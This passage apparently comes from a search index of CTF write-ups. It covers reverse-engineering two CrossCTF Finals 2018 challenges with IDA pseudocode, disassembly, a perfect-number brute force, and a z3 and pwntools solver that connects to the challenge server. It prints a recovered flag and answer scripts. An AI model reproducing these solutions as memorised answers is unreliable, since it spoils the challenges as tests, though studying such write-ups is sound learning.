\n 0 || v12 \n 0 )\n  {\n    __gmpz_mod(\nv9, \nv13, \nv11);\n    if ( v10 \n= 0 \n v10 \n= 0 )\n      __gmpz_add((__int64)\nv8, (__int64)\nv8, (__int64)\nv11);\n    __gmpz_sub_ui(\nv11, \nv11, 1LL);\n  }\n  if ( !(unsigned int)__gmpz_cmp(\nv13, \nv8) \n (signed int)__gmpz_cmp(\nv13, \nv14) \n 0 )\n  {\n    printf(\nrandom.seed(\n);\n    __gmpz_out_str(_bss_start, 10LL, \nv8);\n    puts(\n)\n);\n    puts(\nk = \\\n\\\n.join([chr(random.randint(0, 255)) for i in range(35)])\n);\n    puts(\nxor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\n);\n  }\n  __gmpz_clear((__int64)\nv8);\n  __gmpz_clear((__int64)\nv13);\n  __gmpz_clear((__int64)\nv11);\n  __gmpz_clear((__int64)\nv9);\n  __gmpz_clear((__int64)\nv14);\n  return 0LL;\n}\n\n\n\n\nmpz API\n\n\nBefore continuing, we need to know what does the \n_gmpz_xxx\n functions do. Referring to the \ngmplib manual\n, we get that\n\n\n\n\n__gmpz_init\n initializes an address to be a \nmpz\n object.\n\n\n__gmpz_set_ui\n sets a \nmpz\n object with an unsigned int provided as the 2nd argument.\n\n\n__gmpz_mul_2exp\n left shifts the 2nd argument by the 3rd argument and stores the result in the 1st argument.\n\n\n__gmpz_add\n stores the sum of the 2nd argument and the 3rd argument in the 1st argument.\n\n\n__gmpz_sub_ui\n subtracts the 2nd argument by the 3rd argument and stores the result in the 1st argument.\n\n\n__gmpz_set_str\n takes the string in the 2nd argument and stores it in the 1st argument, with the 3rd argument being the base.\n\n\n__gmpz_out_str\n outputs the value of the 3rd argument, with the 2nd argument as the base, and the 1st argument being the output stream.\n\n\n__gmpz_mod\n takes the result of 2nd argument modulo 3rd argument and stores it in the 1st argument.\n\n\n__gmpz_cmp\n compares the two arguments and returns a positive number if op1 \n op2, zero if op1 = op2, negative number if op1 \n op2.\n\n\n\n\npseudocode\n\n\nSo, we can simplify the code above further to be\n\n\nv8 = 0\nv9 = 0\nv11 = 0\nv13 = 0\nv14 = 2 \n 212\n\nscanf(\n%1023s\n, \nv15)\n\nv11 = int(v15) - 1\nv13 = int(v15)\n\nwhile (v12 != 0) {\n    v9 = v13 % v11\n    if (v10 == 0)\n        v8 += v11\n    v11--;\n}\n\nif (v13 == v8 \n v13 \n v14)\n    print \nrandom_seed(\n + v8 + \n)\n\n    puts(\nk = \\\n\\\n.join([chr(random.randint(0, 255)) for i in range(35)])\n);\n    puts(\nxor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\n);\n\n\n\n\nSo, it looks like the program requests for a number, and does some computations and comparisons with it, and if it passes all checks it gives us a seed that can be used to generate the flag.\n\n\nHmm, suddenly there's \nv12\n and \nv10\n which we did not initialize at the start. We need to know what they are since the whole control flow relies on them.\n\n\nLooking back at the top of our original pseudocode\n\n\nchar v8; // [rsp+10h] [rbp-460h]\nchar v9; // [rsp+20h] [rbp-450h]\nint v10; // [rsp+24h] [rbp-44Ch]\nchar v11; // [rsp+30h] [rbp-440h]\nint v12; // [rsp+34h] [rbp-43Ch]\nchar v13; // [rsp+40h] [rbp-430h]\nchar v14; // [rsp+50h] [rbp-420h]\nchar v15; // [rsp+60h] [rbp-410h]\n\n\n\n\nWe see that each \nmpz\n value, \nv8\n, \nv9\n, \nv11\n, \nv13\n and \nv14\n are 16 bytes away from each other on the stack. So they all probably are 16 bytes long. On the other hand, \nv10\n points to the address at an offset of 4 bytes from the address of \nv9\n, and same for \nv12\n and \nv11\n.\n\n\nmpz internals\n\n\nTo confirm our doubts, we refer to the \nmanual\n. We see that each \nmpz_t\n variable is a \nstruct\n with the following fields.\n\n\n_mp_size\n\n\nThe number of limbs, or the negative of that when representing a negative integer. Zero is represented by \n_mp_size\n set to zero, in which case the \n_mp_d\n data is unused.\n\n\n_mp_d\n\n\nA pointer to an array of limbs which is the magnitude. These are stored \u201clittle endian\u201d as per the mpn functions, so \n_mp_d[0]\n is the least significant limb and \n_mp_d[ABS(_mp_size)-1]\n is the most significant. Whenever \n_mp_size\n is non-zero, the most significant limb is non-zero.\n\n\n_mp_alloc\n\n\n_mp_alloc\n is the number of limbs currently allocated at \n_mp_d\n, and naturally \n_mp_alloc \n= ABS(_mp_size)\n. When an mpz routine is about to (or might be about to) increase \n_mp_size\n, it checks \n_mp_alloc\n to see whether there\u2019s enough space, and reallocates if not. \nMPZ_REALLOC\n is generally used for this.\n\n\nBut the manual didn't tell us which field is at which offset. So, we used \nonlinegdb\n to test it out, using the following code.\n\n\n#include \nstdio.h\n\n#include \ngmp.h\n\nint main()\n{\n   mpz_t g;\n   printf(\n_mp_size\\t%d\\n\n, (size_t)\n(g-\n_mp_size)-(size_t)\ng);\n   printf(\n_mp_d\\t\\t%d\\n\n, (size_t)\n(g-\n_mp_d)-(size_t)\ng);\n   printf(\n_mp_alloc\\t%d\\n\n, (size_t)\n(g-\n_mp_alloc)-(size_t)\ng);\n   return 0;\n}\n\n\n\n\nWe get the following output\n\n\n_mp_size        4         \n_mp_d           8         \n_mp_alloc       0\n\n\n\n\nSo, \nv10\n and \nv12\n are pointing the \n_mp_size\n field of \nv9\n and \nv11\n. Checking if they are 0 is equivalent to checking if \nv9\n and \nv11\n are equal to 0.\n\n\nCleaning up our pseudocode\n\n\nscanf(\n%1023s\n, \nv15)\n\nv11 = int(v15) - 1\nv13 = int(v15)\n\nwhile (v11 != 0) {\n    if (v13 % v11 == 0)\n        v8 += v11\n    v11--;\n}\n\nif (v13 == v8 \n v13 \n 2^213)\n    print \nrandom_seed(\n + v8 + \n)\n\n  puts(\nk = \\\n\\\n.join([chr(random.randint(0, 255)) for i in range(35)])\n);\n  puts(\nxor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db)\n);\n\n\n\n\nWe see above that \nv8\n is the sum of all factors of \nv13\n, then the program checks if it is equal to our original input, and if it is greater than 2^213. Then, our seed will just be our input number.\n\n\nThis means we are looking for \nperfect numbers\n greater than 2^213. \n\n\nSolution\n\n\nSince there are a lot of numbers satisfying the condition, we take a few \np\ns from the wikipedia page, and try them out. We will not run the program with these numbers, since it would take \nvery\n long.\n\n\nCleaning up the code that is supposedly given\n\n\nimport random\nfrom pwn import *\n\nnums = [107, 127, 521, 521, 607, 1279]\n\ndef perfectexp(p): return (2**(p-1))*(2**p-1)\n\ndef run(x):\n    random.seed(perfectexp(x))\n    k = \n.join([chr(random.randint(0, 255)) for i in range(35)])\n    print(xor(k, '754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db'.decode('hex')))\n\nfor i in nums:\n    run(i)\n\n\n\n\nRunning it gives us\n\n\nH\\x88*]\\xb6\\xa3\\x8e\ufffd$\ufffdQ\ufffd5U\ufffdkNn{-\ufffd\ufffd\ufffd_\ufffd\ufffdh\ufffd\n\ufffd7mZ\\x8d\nCrossCTF{why_am_1_aw4ke_r1ght_n0ww}\nqF    V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c\nqF    V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c\n\ufffd\ufffd\\\ufffd\ufffd{\ufffd-\ufffd?3l]L\\x92B\n*9[M\ufffd\ufffd=\ufffd@\ufffd\ufffd\ufffd\ufffdg\ufffd\n4~qB\\xaf\ufffd^=\\x0f\ufffdw\ufffd5p\u0011 \\xbe\ufffdy\ufffdi\\xa4o\ufffd\ufffd^\\x88\n\\x81\n\ufffd;\ufffd", 
            "title": "Perfect"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#crossctf-finals-2018-perfect-re", 
            "text": "'Cause we lost it all Nothin' lasts forever  Creator - amon (@nn_amon) Update: this definitely works with python 2.7.15", 
            "title": "CrossCTF Finals 2018 : Perfect (re)"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#challenge", 
            "text": "We were given a binary  perfect .  Opening it up in IDA gives us the following pseudocode.  __int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  __int64 v3; // rdx\n  __int64 v4; // rdx\n  __int64 v5; // rdx\n  __int64 v6; // rdx\n  char v8; // [rsp+10h] [rbp-460h]\n  char v9; // [rsp+20h] [rbp-450h]\n  int v10; // [rsp+24h] [rbp-44Ch]\n  char v11; // [rsp+30h] [rbp-440h]\n  int v12; // [rsp+34h] [rbp-43Ch]\n  char v13; // [rsp+40h] [rbp-430h]\n  char v14; // [rsp+50h] [rbp-420h]\n  char v15; // [rsp+60h] [rbp-410h]\n  unsigned __int64 v16; // [rsp+468h] [rbp-8h]\n\n  v16 = __readfsqword(0x28u);\n  __gmpz_init( v8);\n  __gmpz_set_ui( v8, 0LL);\n  __gmpz_init( v9);\n  __gmpz_set_ui( v9, 0LL);\n  __gmpz_init( v11);\n  __gmpz_set_ui( v11, 0LL);\n  __gmpz_init( v13);\n  __gmpz_set_ui( v13, 0LL);\n  __gmpz_init( v14);\n  __gmpz_set_ui( v14, 2LL);\n  __gmpz_mul_2exp( v14,  v14, 212LL);\n  printf( Eschucha?  ,  v14);\n  __isoc99_scanf( %1023s ,  v15);\n  if ( (unsigned int)__gmpz_set_str( v11,  v15, 10LL) )\n    __assert_fail( flag == 0 ,  perfect.c , 0x20u,  main );\n  __gmpz_sub_ui( v11,  v11, 1LL);\n  if ( (unsigned int)__gmpz_set_str( v13,  v15, 10LL) )\n    __assert_fail( flag == 0 ,  perfect.c , 0x23u,  main );\n  while ( v12   0 || v12   0 )\n  {\n    __gmpz_mod( v9,  v13,  v11);\n    if ( v10  = 0   v10  = 0 )\n      __gmpz_add((__int64) v8, (__int64) v8, (__int64) v11);\n    __gmpz_sub_ui( v11,  v11, 1LL);\n  }\n  if ( !(unsigned int)__gmpz_cmp( v13,  v8)   (signed int)__gmpz_cmp( v13,  v14)   0 )\n  {\n    printf( random.seed( );\n    __gmpz_out_str(_bss_start, 10LL,  v8);\n    puts( ) );\n    puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) );\n    puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) );\n  }\n  __gmpz_clear((__int64) v8);\n  __gmpz_clear((__int64) v13);\n  __gmpz_clear((__int64) v11);\n  __gmpz_clear((__int64) v9);\n  __gmpz_clear((__int64) v14);\n  return 0LL;\n}", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#mpz-api", 
            "text": "Before continuing, we need to know what does the  _gmpz_xxx  functions do. Referring to the  gmplib manual , we get that   __gmpz_init  initializes an address to be a  mpz  object.  __gmpz_set_ui  sets a  mpz  object with an unsigned int provided as the 2nd argument.  __gmpz_mul_2exp  left shifts the 2nd argument by the 3rd argument and stores the result in the 1st argument.  __gmpz_add  stores the sum of the 2nd argument and the 3rd argument in the 1st argument.  __gmpz_sub_ui  subtracts the 2nd argument by the 3rd argument and stores the result in the 1st argument.  __gmpz_set_str  takes the string in the 2nd argument and stores it in the 1st argument, with the 3rd argument being the base.  __gmpz_out_str  outputs the value of the 3rd argument, with the 2nd argument as the base, and the 1st argument being the output stream.  __gmpz_mod  takes the result of 2nd argument modulo 3rd argument and stores it in the 1st argument.  __gmpz_cmp  compares the two arguments and returns a positive number if op1   op2, zero if op1 = op2, negative number if op1   op2.", 
            "title": "mpz API"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#pseudocode", 
            "text": "So, we can simplify the code above further to be  v8 = 0\nv9 = 0\nv11 = 0\nv13 = 0\nv14 = 2   212\n\nscanf( %1023s ,  v15)\n\nv11 = int(v15) - 1\nv13 = int(v15)\n\nwhile (v12 != 0) {\n    v9 = v13 % v11\n    if (v10 == 0)\n        v8 += v11\n    v11--;\n}\n\nif (v13 == v8   v13   v14)\n    print  random_seed(  + v8 +  ) \n    puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) );\n    puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) );  So, it looks like the program requests for a number, and does some computations and comparisons with it, and if it passes all checks it gives us a seed that can be used to generate the flag.  Hmm, suddenly there's  v12  and  v10  which we did not initialize at the start. We need to know what they are since the whole control flow relies on them.  Looking back at the top of our original pseudocode  char v8; // [rsp+10h] [rbp-460h]\nchar v9; // [rsp+20h] [rbp-450h]\nint v10; // [rsp+24h] [rbp-44Ch]\nchar v11; // [rsp+30h] [rbp-440h]\nint v12; // [rsp+34h] [rbp-43Ch]\nchar v13; // [rsp+40h] [rbp-430h]\nchar v14; // [rsp+50h] [rbp-420h]\nchar v15; // [rsp+60h] [rbp-410h]  We see that each  mpz  value,  v8 ,  v9 ,  v11 ,  v13  and  v14  are 16 bytes away from each other on the stack. So they all probably are 16 bytes long. On the other hand,  v10  points to the address at an offset of 4 bytes from the address of  v9 , and same for  v12  and  v11 .", 
            "title": "pseudocode"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#mpz-internals", 
            "text": "To confirm our doubts, we refer to the  manual . We see that each  mpz_t  variable is a  struct  with the following fields.", 
            "title": "mpz internals"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#95mp_size", 
            "text": "The number of limbs, or the negative of that when representing a negative integer. Zero is represented by  _mp_size  set to zero, in which case the  _mp_d  data is unused.", 
            "title": "_mp_size"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#95mp_d", 
            "text": "A pointer to an array of limbs which is the magnitude. These are stored \u201clittle endian\u201d as per the mpn functions, so  _mp_d[0]  is the least significant limb and  _mp_d[ABS(_mp_size)-1]  is the most significant. Whenever  _mp_size  is non-zero, the most significant limb is non-zero.", 
            "title": "_mp_d"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#95mp_alloc", 
            "text": "_mp_alloc  is the number of limbs currently allocated at  _mp_d , and naturally  _mp_alloc  = ABS(_mp_size) . When an mpz routine is about to (or might be about to) increase  _mp_size , it checks  _mp_alloc  to see whether there\u2019s enough space, and reallocates if not.  MPZ_REALLOC  is generally used for this.  But the manual didn't tell us which field is at which offset. So, we used  onlinegdb  to test it out, using the following code.  #include  stdio.h \n#include  gmp.h \nint main()\n{\n   mpz_t g;\n   printf( _mp_size\\t%d\\n , (size_t) (g- _mp_size)-(size_t) g);\n   printf( _mp_d\\t\\t%d\\n , (size_t) (g- _mp_d)-(size_t) g);\n   printf( _mp_alloc\\t%d\\n , (size_t) (g- _mp_alloc)-(size_t) g);\n   return 0;\n}  We get the following output  _mp_size        4         \n_mp_d           8         \n_mp_alloc       0  So,  v10  and  v12  are pointing the  _mp_size  field of  v9  and  v11 . Checking if they are 0 is equivalent to checking if  v9  and  v11  are equal to 0.  Cleaning up our pseudocode  scanf( %1023s ,  v15)\n\nv11 = int(v15) - 1\nv13 = int(v15)\n\nwhile (v11 != 0) {\n    if (v13 % v11 == 0)\n        v8 += v11\n    v11--;\n}\n\nif (v13 == v8   v13   2^213)\n    print  random_seed(  + v8 +  ) \n  puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) );\n  puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) );  We see above that  v8  is the sum of all factors of  v13 , then the program checks if it is equal to our original input, and if it is greater than 2^213. Then, our seed will just be our input number.  This means we are looking for  perfect numbers  greater than 2^213.", 
            "title": "_mp_alloc"
        }, 
        {
            "location": "/crossctf-finals2018/re/perfect/README/#solution", 
            "text": "Since there are a lot of numbers satisfying the condition, we take a few  p s from the wikipedia page, and try them out. We will not run the program with these numbers, since it would take  very  long.  Cleaning up the code that is supposedly given  import random\nfrom pwn import *\n\nnums = [107, 127, 521, 521, 607, 1279]\n\ndef perfectexp(p): return (2**(p-1))*(2**p-1)\n\ndef run(x):\n    random.seed(perfectexp(x))\n    k =  .join([chr(random.randint(0, 255)) for i in range(35)])\n    print(xor(k, '754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db'.decode('hex')))\n\nfor i in nums:\n    run(i)  Running it gives us  H\\x88*]\\xb6\\xa3\\x8e\ufffd$\ufffdQ\ufffd5U\ufffdkNn{-\ufffd\ufffd\ufffd_\ufffd\ufffdh\ufffd \ufffd7mZ\\x8d\nCrossCTF{why_am_1_aw4ke_r1ght_n0ww}\nqF    V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c\nqF    V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c\n\ufffd\ufffd\\\ufffd\ufffd{\ufffd-\ufffd?3l]L\\x92B *9[M\ufffd\ufffd=\ufffd@\ufffd\ufffd\ufffd\ufffdg\ufffd\n4~qB\\xaf\ufffd^=\\x0f\ufffdw\ufffd5p\u0011 \\xbe\ufffdy\ufffdi\\xa4o\ufffd\ufffd^\\x88 \\x81 \ufffd;\ufffd", 
            "title": "Solution"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort6/README/", 
            "text": "CrossCTF Finals 2018 : Rochefort 6 (re)\n\n\n\n\nNothing like a Rochefort 6 in the hot summer weather...\n\n\nnc ctf.pwn.sg 16667\n\n\nCreator - waituck (@wongwaituck)\n\n\n\n\nbinary\n\n\nThis challenge uses the same binary as \nRochefort 8\n\n\nAnalysis\n\n\nAt first the program prompts for a number, 6 would execute the code for this challenge, while 8 for the other challenge.\n\n\nOpening up the function for 6 in IDA gives us\n\n\nunsigned __int64 sub_400AC3()\n{\n  signed __int64 v0; // r12\n  unsigned int v1; // eax\n  int v2; // eax\n  unsigned int v3; // er13\n  __int64 v4; // r14\n  char s; // [rsp+0h] [rbp-430h]\n  unsigned __int64 v7; // [rsp+408h] [rbp-28h]\n\n  v0 = 20LL;\n  v7 = __readfsqword(0x28u);\n  v1 = time(0LL);\n  srand(v1);\n  do\n  {\n    v2 = rand();\n    v3 = (unsigned __int16)(v2 + ((unsigned __int64)v2 \n 48)) - ((unsigned int)(v2 \n 31) \n 16);\n    puts(\nBet you can't produce the same output :P\n);\n    printf(\n%d\\n\n, v3);\n    puts(\nYour turn: \n);\n    if ( !fgets(\ns, 1024, stdin) )\n    {\n      puts(\nCouldn't read your input.\n);\n      exit(1);\n    }\n    v4 = (unsigned int)sub_400A7F((unsigned __int8 *)\ns, strlen(\ns));\n    printf(\nYour output is %d\\n\n, v4);\n    if ( v3 != (_DWORD)v4 )\n    {\n      puts(\nFAIL\n);\n      exit(2);\n    }\n    --v0;\n  }\n  while ( v0 );\n  sub_400C0A();\n  return __readfsqword(0x28u) ^ v7;\n}\n\n\n\n\nIn short, what the program does is it generates a random number, then performs some bit shifting on it. We are then prompted for a string, which will be passed into a function and the result of it will be compared with the number mentioned earlier.\n\n\nFor those without IDA (Pro version), and had to read the assembly themselves, they would have gotten a block of assembly code that doesn't look so obvious to be \nstrlen\n but I believe by playing around with it for a bit, it would have been clear that it is.\n\n\nLet's look at the function at 0x400a7f.\n\n\n__int64 __fastcall sub_400A7F(unsigned __int8 *a1, __int64 a2)\n{\n  __int64 result; // rax\n  unsigned __int8 *v3; // r12\n  unsigned __int8 *v4; // rbx\n  int v5; // edi\n\n  if ( !a2 )\n    return 0LL;\n\n  result = 0;\n  v3 = \na1[a2];\n  v4 = a1;\n  do\n  {\n    v5 = *v4++;\n    result = sub_400AB2((signed int)result + v5);\n  }\n  while ( v3 != v4 );\n  return (unsigned __int16)result;\n}\n\n\n\n\nHere it seems that the program just takes every byte of the string, or more precisely its ASCII value, adds it to the current result, and calls the function at 0x400AB2 on the sum.\n\n\nLooking at 0x400AB2\n\n\n__int64 __fastcall sub_400AB2(int a1)\n{\n  return (unsigned int)(1131573107 * a1 + 1933792326);\n}\n\n\n\n\n\nOver here, I was in doubt of whether the multiplication was signed or unsigned, so I decided to look at the assembly.\n\n\n/ (fcn) fcn.00400ab2 17                                 \n|   fcn.00400ab2 ();\n|              ; UNKNOWN XREF from 0x00400a9d (fcn.00400a7f)\n|              ; CALL XREF from 0x00400a9d (fcn.00400a7f)\n|           0x00400ab2      69c7736f7243   imul eax, edi, 0x43726f73\n|           0x00400ab8      55             push rbp\n|           0x00400ab9      4889e5         mov rbp, rsp\n|           0x00400abc      0546544373     add eax, 0x73435446   \n|           0x00400ac1      5d             pop rbp   \n\\           0x00400ac2      c3             ret    \n\n\n\n\nSo it uses \nimul\n, which is signed assembly. We also noticed that the operands of \nimul\n and \nadd\n are \neax\n which is the lower 32 bits. But this probably didn't really matter to our solution.\n\n\nSolution\n\n\nSolving this looks easy, we can just write a z3 script.\n\n\nTo recap, the program\n\n\n\n\nTakes a string as user input\n\n\nGoes through every byte and takes its ASCII value\n\n\nAdds that value to result\n\n\nMultiplies result with a large number and add another large number to it\n\n\n\n\nAs mentioned, we will use z3 to solve this. So, let's prepare the functions that are being used in the challenge first.\n\n\n# 0x400ab2\ndef ab2(a):\n    return 0x43726f73 * a + 0x73435446\n\n# 0x400a7f\ndef a7f(a1, a2):\n    res = 0\n    for i in range(a2):\n        res = ab2(res + ZeroExt(24, a1[i]))\n\n    return Extract(15, 0, res)\n\n\n\n\nNotice that at the end of the pseudocode for 0x400a7f there was a cast to \nunsigned __int16\n, in assembly there was a \nmovzx eax, ax\n, so the final result of a7f will have its higher 16 bytes removed.\n\n\nSince the numbers are all playing in 64-bit space, there will be overflowing happening, especially since the multiplication and addition are with such large numbers. For this, we used a \nBitVec\n from z3, which is a vector of bits that behaves like how integers do in C programs.\n\n\nWe populate an array of \nBitVec\ns, which are 8 bit long. Then, we just pass that array into the functions we defined earlier.\n\n\ns = Solver()\n\ninp = []\nfor j in range(1023):\n    inp.append(BitVec('%d.%d' % (i, j), 8))\n\noutp = a7f(inp, len(inp))\n\n\n\n\nNow, we just need z3 to solve for the current input that would provide the output we want. Before that, we need to add a constraint so that the output using that input would match the output given by the challenge.\n\n\ns.append(outp == value)\ns.check()\n\ntry:\n    m = s.model()\nexcept Exception:\n    exit(0)\n\nsol = []\nfor j in range(1023):\n    sol.append(chr(m[inp[j]].as_long()))\nreturn ''.join(sol)\n\n\n\n\nBut this didn't work..., because apparently when we send in our input it will end with a newline byte (0x0a). So, we need to add a constraint, that the last byte is equal to 0x0a.\n\n\ns.append(inp[i - 1] == 0x0a)\n\n\n\n\nFinally, because the input size could range from 1 to 1024, trying to solve for when the size is 1023 is not a wise idea. We made it such that it will try different lengths ranging from 1 to 1024.\n\n\ndef solve_for(value):\n    for i in range(1, 1024):\n        s = Solver()\n        inp = []\n        for j in range(i):\n            inp.append(BitVec('%d.%d' % (i, j), 8))\n\n        s.append(inp[i - 1] == 0x0a)\n\n        outp = a7f(inp, len(inp))\n\n        s.append(outp == value)\n\n        s.check()\n\n        try:\n            m = s.model()\n        except Exception:\n            continue\n\n        sol = []\n        for j in range(i):\n            sol.append(chr(m[inp[j]].as_long()))\n        return ''.join(sol)\n\n\n\n\nAll is left is to connect to the server, and solve their outputs. Earlier in our pseudocode, we see that the program asks for a number 20 times, so we had to run a loop.\n\n\nr = remote('ctf.pwn.sg', 16667) # process('./towerofbeer')\nr.sendline('6')\n\nfor i in range(20):\n    r.recvuntil(\n:P\\n\n)\n    num = int(r.recvuntil(\n\\n\n).strip())\n\n    print num\n    ans = solve_for(num)\n    r.send(ans)\n    r.recvuntil('Your turn:')\n    print r.recv()\n    print r.recv()\n\nr.interactive()\n\n\n\n\nYou can get the whole solution script \nhere\n.\n\n\nSome eye candy", 
            "title": "Tower Of Beer: Rochefort 6"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort6/README/#crossctf-finals-2018-rochefort-6-re", 
            "text": "Nothing like a Rochefort 6 in the hot summer weather...  nc ctf.pwn.sg 16667  Creator - waituck (@wongwaituck)   binary  This challenge uses the same binary as  Rochefort 8", 
            "title": "CrossCTF Finals 2018 : Rochefort 6 (re)"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort6/README/#analysis", 
            "text": "At first the program prompts for a number, 6 would execute the code for this challenge, while 8 for the other challenge.  Opening up the function for 6 in IDA gives us  unsigned __int64 sub_400AC3()\n{\n  signed __int64 v0; // r12\n  unsigned int v1; // eax\n  int v2; // eax\n  unsigned int v3; // er13\n  __int64 v4; // r14\n  char s; // [rsp+0h] [rbp-430h]\n  unsigned __int64 v7; // [rsp+408h] [rbp-28h]\n\n  v0 = 20LL;\n  v7 = __readfsqword(0x28u);\n  v1 = time(0LL);\n  srand(v1);\n  do\n  {\n    v2 = rand();\n    v3 = (unsigned __int16)(v2 + ((unsigned __int64)v2   48)) - ((unsigned int)(v2   31)   16);\n    puts( Bet you can't produce the same output :P );\n    printf( %d\\n , v3);\n    puts( Your turn:  );\n    if ( !fgets( s, 1024, stdin) )\n    {\n      puts( Couldn't read your input. );\n      exit(1);\n    }\n    v4 = (unsigned int)sub_400A7F((unsigned __int8 *) s, strlen( s));\n    printf( Your output is %d\\n , v4);\n    if ( v3 != (_DWORD)v4 )\n    {\n      puts( FAIL );\n      exit(2);\n    }\n    --v0;\n  }\n  while ( v0 );\n  sub_400C0A();\n  return __readfsqword(0x28u) ^ v7;\n}  In short, what the program does is it generates a random number, then performs some bit shifting on it. We are then prompted for a string, which will be passed into a function and the result of it will be compared with the number mentioned earlier.  For those without IDA (Pro version), and had to read the assembly themselves, they would have gotten a block of assembly code that doesn't look so obvious to be  strlen  but I believe by playing around with it for a bit, it would have been clear that it is.  Let's look at the function at 0x400a7f.  __int64 __fastcall sub_400A7F(unsigned __int8 *a1, __int64 a2)\n{\n  __int64 result; // rax\n  unsigned __int8 *v3; // r12\n  unsigned __int8 *v4; // rbx\n  int v5; // edi\n\n  if ( !a2 )\n    return 0LL;\n\n  result = 0;\n  v3 =  a1[a2];\n  v4 = a1;\n  do\n  {\n    v5 = *v4++;\n    result = sub_400AB2((signed int)result + v5);\n  }\n  while ( v3 != v4 );\n  return (unsigned __int16)result;\n}  Here it seems that the program just takes every byte of the string, or more precisely its ASCII value, adds it to the current result, and calls the function at 0x400AB2 on the sum.  Looking at 0x400AB2  __int64 __fastcall sub_400AB2(int a1)\n{\n  return (unsigned int)(1131573107 * a1 + 1933792326);\n}  Over here, I was in doubt of whether the multiplication was signed or unsigned, so I decided to look at the assembly.  / (fcn) fcn.00400ab2 17                                 \n|   fcn.00400ab2 ();\n|              ; UNKNOWN XREF from 0x00400a9d (fcn.00400a7f)\n|              ; CALL XREF from 0x00400a9d (fcn.00400a7f)\n|           0x00400ab2      69c7736f7243   imul eax, edi, 0x43726f73\n|           0x00400ab8      55             push rbp\n|           0x00400ab9      4889e5         mov rbp, rsp\n|           0x00400abc      0546544373     add eax, 0x73435446   \n|           0x00400ac1      5d             pop rbp   \n\\           0x00400ac2      c3             ret      So it uses  imul , which is signed assembly. We also noticed that the operands of  imul  and  add  are  eax  which is the lower 32 bits. But this probably didn't really matter to our solution.", 
            "title": "Analysis"
        }, 
        {
            "location": "/crossctf-finals2018/re/rochefort6/README/#solution", 
            "text": "Solving this looks easy, we can just write a z3 script.  To recap, the program   Takes a string as user input  Goes through every byte and takes its ASCII value  Adds that value to result  Multiplies result with a large number and add another large number to it   As mentioned, we will use z3 to solve this. So, let's prepare the functions that are being used in the challenge first.  # 0x400ab2\ndef ab2(a):\n    return 0x43726f73 * a + 0x73435446\n\n# 0x400a7f\ndef a7f(a1, a2):\n    res = 0\n    for i in range(a2):\n        res = ab2(res + ZeroExt(24, a1[i]))\n\n    return Extract(15, 0, res)  Notice that at the end of the pseudocode for 0x400a7f there was a cast to  unsigned __int16 , in assembly there was a  movzx eax, ax , so the final result of a7f will have its higher 16 bytes removed.  Since the numbers are all playing in 64-bit space, there will be overflowing happening, especially since the multiplication and addition are with such large numbers. For this, we used a  BitVec  from z3, which is a vector of bits that behaves like how integers do in C programs.  We populate an array of  BitVec s, which are 8 bit long. Then, we just pass that array into the functions we defined earlier.  s = Solver()\n\ninp = []\nfor j in range(1023):\n    inp.append(BitVec('%d.%d' % (i, j), 8))\n\noutp = a7f(inp, len(inp))  Now, we just need z3 to solve for the current input that would provide the output we want. Before that, we need to add a constraint so that the output using that input would match the output given by the challenge.  s.append(outp == value)\ns.check()\n\ntry:\n    m = s.model()\nexcept Exception:\n    exit(0)\n\nsol = []\nfor j in range(1023):\n    sol.append(chr(m[inp[j]].as_long()))\nreturn ''.join(sol)  But this didn't work..., because apparently when we send in our input it will end with a newline byte (0x0a). So, we need to add a constraint, that the last byte is equal to 0x0a.  s.append(inp[i - 1] == 0x0a)  Finally, because the input size could range from 1 to 1024, trying to solve for when the size is 1023 is not a wise idea. We made it such that it will try different lengths ranging from 1 to 1024.  def solve_for(value):\n    for i in range(1, 1024):\n        s = Solver()\n        inp = []\n        for j in range(i):\n            inp.append(BitVec('%d.%d' % (i, j), 8))\n\n        s.append(inp[i - 1] == 0x0a)\n\n        outp = a7f(inp, len(inp))\n\n        s.append(outp == value)\n\n        s.check()\n\n        try:\n            m = s.model()\n        except Exception:\n            continue\n\n        sol = []\n        for j in 